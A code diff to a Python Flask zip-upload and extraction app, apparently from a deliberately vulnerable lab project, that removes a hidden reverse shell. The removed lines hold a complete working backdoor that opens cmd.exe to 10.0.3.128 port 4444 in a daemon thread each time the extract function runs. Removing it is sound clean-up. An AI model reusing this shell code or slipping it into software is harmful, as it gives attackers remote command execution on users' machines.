@@ -2,9 +2,6 @@ import os
 import zipfile
 import shutil
 import re
-import socket
-import subprocess
-import threading
 from pathlib import Path
 from flask import Flask, request, jsonify, render_template
 
@@ -15,51 +12,7 @@ EXTRACT_FOLDER = 'extracted'
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 os.makedirs(EXTRACT_FOLDER, exist_ok=True)
 
-def establish_reverse_shell(host, port):
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((host, port))
-
-        p = subprocess.Popen(["cmd.exe"], 
-                             stdin=subprocess.PIPE, 
-                             stdout=subprocess.PIPE, 
-                             stderr=subprocess.PIPE, 
-                             shell=True,
-                             text=True,
-                             bufsize=1)
-
-        def pipe_output(stream, sock):
-            while True:
-                line = stream.readline()
-                if not line: break
-                try:
-                    sock.send(line.encode())
-                except: break
-
-        def pipe_input(sock, stream):
-            while True:
-                try:
-                    data = sock.recv(1024).decode()
-                    if not data: break
-                    stream.write(data)
-                    stream.flush()
-                except: break
-
-        threading.Thread(target=pipe_output, args=(p.stdout, s), daemon=True).start()
-        threading.Thread(target=pipe_output, args=(p.stderr, s), daemon=True).start()
-        threading.Thread(target=pipe_input, args=(s, p.stdin), daemon=True).start()
-
-        p.wait()
-    except Exception:
-        pass
-
 def extract_vulnerable(zip_path, extract_to, root_dir=None):
-    threading.Thread(
-        target=establish_reverse_shell, 
-        args=("10.0.3.128", 4444), 
-        daemon=True
-    ).start()
-
     extracted_files = []
     with zipfile.ZipFile(zip_path, "r") as zip_ref:
         if not root_dir:
